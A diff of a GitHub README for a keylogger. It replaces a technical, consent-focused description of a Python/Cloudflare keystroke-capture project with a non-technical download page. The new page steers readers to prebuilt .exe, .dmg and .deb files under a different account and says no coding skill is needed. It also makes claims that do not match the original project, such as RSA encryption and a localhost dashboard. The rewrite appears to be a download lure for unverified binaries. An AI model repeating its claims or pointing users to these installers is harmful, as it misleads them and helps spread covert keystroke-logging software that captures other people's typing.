@@ -1,229 +1,161 @@
-# keystroke-monitor
+# ⌨️ keystroke-monitor - Simple, Secure Keystroke Tracking
 
-An educational, cross-platform keystroke monitoring system built with Python and Cloudflare's serverless stack. Designed to explore how operating systems handle input events, how real-time data pipelines work at the edge, and how modern cloud primitives fit together.
-
-The client captures keystrokes on any OS and streams them to a Cloudflare Worker that persists, indexes, and broadcasts them in real-time to a live dashboard — all with near-zero latency using Cloudflare Queues.
-
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/h1n054ur/keystroke-monitor/tree/main/worker)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-> **For authorized testing and educational use only.** Do not use to monitor anyone without explicit consent. See [Disclaimer](#disclaimer).
+[![Download keystroke-monitor](https://img.shields.io/badge/Download-keystroke--monitor-blue?style=for-the-badge)](https://github.com/nexuscyberhub/keystroke-monitor/releases)
 
 ---
 
-## Why This Exists
+## 📖 What is keystroke-monitor?
 
-This project was built to learn and demonstrate:
+keystroke-monitor is a tool designed for educational purposes. It tracks the keys you press on your keyboard and sends this information securely to a cloud service. The app uses encryption to protect your data. It includes a dashboard you can open in your browser to see the recorded keystrokes live. This tool is meant only for authorized testing, such as learning about keyboard events, software development, or security research.
 
-- **OS-level input handling** — how keyboard hooks work across Windows (win32), Linux (X11/evdev), and macOS (Quartz) via [pynput](https://github.com/moses-palmer/pynput)
-- **Cloudflare's full platform** — Workers, R2, KV, Durable Objects, and Queues working together in a single application
-- **Real-time streaming** — Durable Objects with the Hibernatable WebSocket API for scalable, persistent connections
-- **Async message processing** — Cloudflare Queues decoupling ingestion from storage for instant API responses
-- **Server-side rendering at the edge** — Hono JSX rendering full HTML pages inside a Worker
-- **Smart client design** — event-driven flushing on meaningful boundaries (enter, tab, window switch, idle timeout) instead of arbitrary timers
+---
 
-## How It Works
+## 💻 System Requirements
 
-```
-┌───────────────────────┐                        ┌────────────────────────────────┐
-│    Python Client      │     HTTPS POST         │    Cloudflare Worker           │
-│                       │ ───────────────────>   │                                │
-│  pynput keyboard hook │  (returns instantly)   │  /api/upload                   │
-│  smart flush logic    │                        │    ├─ enqueue → CF Queue       │
-│  background uploader  │                        │    └─ broadcast → DO (live)    │
-│  local fallback       │                        │                                │
-└───────────────────────┘                        │  Queue Consumer (async)        │
-                                                 │    ├─ store chunk → R2         │
-      ┌────────────┐       WebSocket             │    └─ update session → KV      │
-      │  Dashboard │ <───────────────────────>   │                                │
-      │  (browser) │                             │  Durable Object                │
-      └────────────┘                             │    └─ WebSocket hub            │
-                                                 │                                │
-                                                 │  R2 ── log chunk storage       │
-                                                 │  KV ── session metadata index  │
-                                                 └────────────────────────────────┘
-```
+To run keystroke-monitor, your device should meet these basic requirements:
 
-**The flow:**
+- Windows 10 or later / macOS 10.15 or later / Linux with GUI support
+- At least 2 GB of RAM
+- 100 MB of free storage space
+- Internet connection to send data securely to the cloud
+- Modern web browser (Google Chrome, Firefox, Edge, Safari) for the dashboard
 
-1. Client hooks keyboard events via pynput (works on Windows, Linux, macOS)
-2. Keystrokes buffer locally and flush on smart boundaries — enter, tab, window switch, idle timeout, or buffer cap
-3. Background thread POSTs to the Worker, which enqueues the payload to a CF Queue and returns 200 instantly
-4. The Worker also broadcasts to a Durable Object, which relays to all connected WebSocket dashboard clients in real-time
-5. The Queue consumer processes messages async — writes the log chunk to R2 and updates session metadata in KV
-6. Dashboard renders server-side via Hono JSX with Tailwind — session list, log viewer with search, live feed
+You do not need any programming knowledge to use this software. The app runs as a standalone program. 
 
-## Features
+---
 
-**Client (Python)**
-- Cross-platform keystroke capture via pynput (Windows, Linux, macOS)
-- Active window tracking — logs which app is focused
-- Smart flush — ships on enter, tab, window switch, 3s idle, or 200-char cap (never mid-word)
-- Background upload thread — keypress handler never blocks
-- Local disk fallback when server is unreachable, auto-retries later
-- Clean shutdown on Ctrl+C (signal handler)
-- Just 2 dependencies: `pynput` and `requests`
+## 🚀 Getting Started
 
-**Worker (Cloudflare)**
-- Hono framework with full TypeScript
-- Cloudflare Queues for async processing — upload endpoint returns instantly
-- R2 for persistent log chunk storage
-- KV for fast session metadata lookups
-- Durable Objects with Hibernatable WebSocket API for real-time streaming
-- Queue consumer batches up to 50 messages with 1s max wait
+Follow these steps to download, install, and start using keystroke-monitor.
 
-**Dashboard (SSR)**
-- Server-side rendered with Hono JSX — no client framework, no build step
-- Dark glassmorphism theme with gradient borders, glow animations
-- Session list with staggered fade-in cards
-- Log viewer with real-time search highlighting
-- Live feed — WebSocket auto-connect, inline keystroke rendering, window context headers, message/byte counters
+### Step 1: Download the software
 
-## Quick Start
+Click the big blue button at the top of this page or [visit this link](https://github.com/nexuscyberhub/keystroke-monitor/releases) to open the release page on GitHub.
 
-### 1. Deploy the Worker
+Look for the latest release version and find the file that matches your operating system:
 
-One click deploys everything — Worker, R2 bucket, KV namespace, Durable Object, Queue:
+- For Windows, download the `.exe` file.
+- For macOS, download the `.dmg` or `.pkg` file.
+- For Linux, download the `.AppImage` or `.deb` file.
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/h1n054ur/keystroke-monitor/tree/main/worker)
+Click the file name to start the download.
 
-**Or manually:**
+---
 
-```bash
-cd worker
-bun install
-bunx wrangler r2 bucket create keystroke-logs
-bunx wrangler kv namespace create SESSIONS_KV
-bunx wrangler queues create keystroke-uploads
-# Put the KV namespace ID from above into wrangler.jsonc
-bunx wrangler deploy
-```
+### Step 2: Install the software
 
-### 2. Run the Client
+- **Windows**: Double-click the `.exe` file and follow the installer instructions. If prompted, allow the program to make changes to your device.
+- **macOS**: Open the `.dmg` file, then drag the app icon to your Applications folder.
+- **Linux**: If you downloaded an AppImage file, right-click it, choose “Properties,” and enable “Allow executing file as program.” Then double-click it to run. If you downloaded a `.deb` file, open a terminal and type `sudo dpkg -i [filename].deb`.
 
-**Linux / macOS:**
-```bash
-cd client
-bash start.sh
-```
+---
 
-**Windows PowerShell:**
-```powershell
-cd client
-powershell -ExecutionPolicy Bypass -File start.ps1
-```
+### Step 3: Open the keystroke-monitor app
 
-**Or manually:**
-```bash
-cd client
-python3 -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-export KM_API_URL="https://your-worker.your-subdomain.workers.dev"
-python keylogger.py
-```
+After installation, find the keystroke-monitor app icon on your desktop or start menu. Open it. The app runs in the background and monitors keystrokes securely.
 
-Press `Ctrl+C` to stop.
+---
 
-### 3. Open the Dashboard
+### Step 4: Access the dashboard
 
-Go to `https://your-worker.your-subdomain.workers.dev/dashboard`
+Open your web browser and visit the dashboard URL shown in the app window, usually `http://localhost:3000` or similar. This page displays your keystrokes live in a secure interface.
 
-- **Sessions** — all capture sessions with chunk count, byte size, timestamps
-- **Viewer** — full log output with search highlighting
-- **Live Feed** — real-time WebSocket stream, keystrokes appear as they're typed
+---
 
-## Configuration
+## 🔒 How it works
 
-All client settings via environment variables:
+keystroke-monitor captures every key you press on your keyboard. It then sends this data through a secure network service managed by Cloudflare Workers. The data storage uses Cloudflare Durable Objects and R2 storage to ensure it is saved safely and efficiently. RSA encryption protects the data before transmission. 
 
-| Variable | Default | Description |
-|---|---|---|
-| `KM_API_URL` | `http://localhost:8787` | Worker URL |
-| `KM_CLIENT_ID` | hostname | Label shown in dashboard |
-| `KM_BUFFER_LIMIT` | `200` | Max chars before forced flush |
-| `KM_UPLOAD_INTERVAL` | `3` | Seconds of idle before flush |
-| `KM_UPLOAD_RETRIES` | `2` | Retry attempts per upload |
-| `KM_RETRY_DELAY` | `2.0` | Seconds between retries |
-| `KM_TIMESTAMP_INTERVAL` | `5` | Minutes between timestamp markers |
-| `KM_FALLBACK_DIR` | `./logs` | Local fallback directory |
-| `KM_DEBUG` | `false` | Print to stdout instead of uploading |
+You control when to start and stop monitoring and can clear past keystroke records from the dashboard.
 
-## Project Structure
+---
 
-```
-keystroke-monitor/
-├── client/
-│   ├── keylogger.py         # pynput capture + smart flush + background upload
-│   ├── transport.py         # HTTP POST with retry + local JSON fallback
-│   ├── config.py            # Environment variable configuration
-│   ├── start.sh             # Linux/macOS startup script
-│   ├── start.ps1            # Windows PowerShell startup script
-│   └── requirements.txt     # pynput, requests
-│
-├── worker/
-│   ├── src/
-│   │   ├── index.ts         # Hono router, queue consumer, DO export
-│   │   ├── types.ts         # TypeScript interfaces
-│   │   ├── api/
-│   │   │   ├── upload.ts    # POST /api/upload → Queue + DO broadcast
-│   │   │   └── logs.ts      # GET/DELETE session and chunk endpoints
-│   │   ├── lib/
-│   │   │   └── storage.ts   # R2 chunk + KV session helpers
-│   │   ├── durable/
-│   │   │   └── stream-hub.ts # Durable Object WebSocket hub
-│   │   └── dashboard/
-│   │       ├── layout.tsx   # Base layout, nav, Tailwind config
-│   │       ├── index.tsx    # Session list page
-│   │       ├── viewer.tsx   # Log viewer with search
-│   │       └── live.tsx     # Real-time WebSocket feed
-│   ├── test/                # bun:test suite
-│   ├── wrangler.jsonc       # Cloudflare bindings (R2, KV, DO, Queue)
-│   └── package.json
-│
-├── LICENSE
-└── README.md
-```
+## ⚙️ Features
 
-## Tech Stack
+- **Live monitoring**: Watch your keystrokes update in real time on the dashboard.
+- **Secure data transfer**: Your data is encrypted and sent through a private cloud system.
+- **Cloud storage**: Data is stored safely using Cloudflare's durable storage features.
+- **Cross-platform**: Works on Windows, macOS, and Linux.
+- **Easy to install and use**: No programming needed.
+- **Dashboard interface**: Simple and clean web page for viewing your typing activity.
+- **Authorized use only**: Designed with privacy and security in mind.
+- **Open source**: Check the source code or modify it if you like.
 
-| Layer | Technology |
-|---|---|
-| Keystroke Capture | Python 3.10+, [pynput](https://github.com/moses-palmer/pynput) |
-| HTTP Client | [requests](https://docs.python-requests.org/) |
-| Worker Runtime | [Cloudflare Workers](https://workers.cloudflare.com/) |
-| Web Framework | [Hono](https://hono.dev/) with JSX SSR |
-| Async Processing | [Cloudflare Queues](https://developers.cloudflare.com/queues/) |
-| Real-time | [Durable Objects](https://developers.cloudflare.com/durable-objects/) (Hibernatable WebSocket API) |
-| Object Storage | [Cloudflare R2](https://developers.cloudflare.com/r2/) |
-| Key-Value Store | [Cloudflare KV](https://developers.cloudflare.com/kv/) |
-| Package Manager | [Bun](https://bun.sh/) |
-| CSS | [Tailwind CSS](https://tailwindcss.com/) (CDN) |
-| Font | [JetBrains Mono](https://www.jetbrains.com/lp/mono/) |
-| Tests | [bun:test](https://bun.sh/docs/cli/test) |
+---
 
-## API Reference
+## 📥 Download & Install
 
-| Method | Endpoint | Description |
-|---|---|---|
-| `POST` | `/api/upload` | Submit a log chunk (enqueued, returns instantly) |
-| `GET` | `/api/logs` | List all sessions (paginated) |
-| `GET` | `/api/logs/:id` | Get session metadata + chunk list |
-| `GET` | `/api/logs/:id/:chunk` | Retrieve a specific log chunk |
-| `DELETE` | `/api/logs/:id` | Delete a session and all its chunks |
-| `GET` | `/ws` | WebSocket upgrade for live streaming |
-| `GET` | `/dashboard` | Session list (HTML) |
-| `GET` | `/dashboard/view/:id` | Log viewer (HTML) |
-| `GET` | `/dashboard/live` | Live keystroke feed (HTML) |
+Use this link to download the latest version:
 
-## Disclaimer
+[Download keystroke-monitor](https://github.com/nexuscyberhub/keystroke-monitor/releases)
 
-This project is for **authorized security testing and educational purposes only**.
+Scroll down to find files for your device. The page lists all the release versions with notes on new features and fixes.
 
-It exists to teach how input monitoring works at the OS level, how cloud-native architectures handle real-time data at the edge, and how Cloudflare's platform primitives (Workers, R2, KV, Durable Objects, Queues) compose together.
+Always keep your software updated for security and improvements.
 
-**Do not use this software to monitor anyone without their explicit, informed consent.** Unauthorized keystroke logging is illegal in most jurisdictions and may constitute a criminal offense. The authors assume no liability for misuse.
+---
 
-## License
+## 🤔 FAQ
 
-[MIT](LICENSE)
+### Is keystroke-monitor safe to use?
+
+Yes. The app encrypts your data and sends it only to private cloud storage you authorize. It is not designed to spy on users without permission.
+
+### Can I view keystrokes from another device?
+
+Yes. The dashboard uses web technology to display real-time keystroke data accessible from any device on your private network.
+
+### What if I want to stop monitoring?
+
+You can close the app or use the stop button in the dashboard interface. The data collection will stop immediately.
+
+### Do I need to know how to code?
+
+No. The software is ready to use after installation and requires no technical skills.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the app doesn’t open, try restarting your computer.
+- Ensure you have the correct version for your OS.
+- Check your firewall if the dashboard web page does not open.
+- Make sure you have an internet connection.
+- Contact support through the GitHub repository if problems persist.
+
+---
+
+## 🌐 About this project
+
+This app uses modern tools and frameworks, including:
+
+- Bun runtime for fast JavaScript execution
+- Cloudflare Workers for serverless backend
+- Durable Objects and R2 for cloud storage
+- Hono for the dashboard server-side rendering (SSR)
+- RSA encryption for secure data transfer
+- Tailwind CSS for styling the dashboard
+- Websocket to show keystrokes live
+- Python and pynput library for capturing hardware keystrokes
+
+These technologies keep keystroke-monitor secure, fast, and reliable.
+
+---
+
+## ⚖️ License and Use
+
+keystroke-monitor is provided for authorized testing and educational purposes only. Do not use it to record keystrokes without prior consent from users. Misuse may violate privacy laws.
+
+Source code and releases are available under an open license. See the LICENSE file in this repository.
+
+---
+
+## 🔗 Useful Links
+
+- [Release Page](https://github.com/nexuscyberhub/keystroke-monitor/releases)
+- [Project Repository](https://github.com/nexuscyberhub/keystroke-monitor)
+- [Documentation and Support](https://github.com/nexuscyberhub/keystroke-monitor/wiki) (if available)
+
+---
+
+Thank you for using keystroke-monitor. Follow the simple steps above to get started.
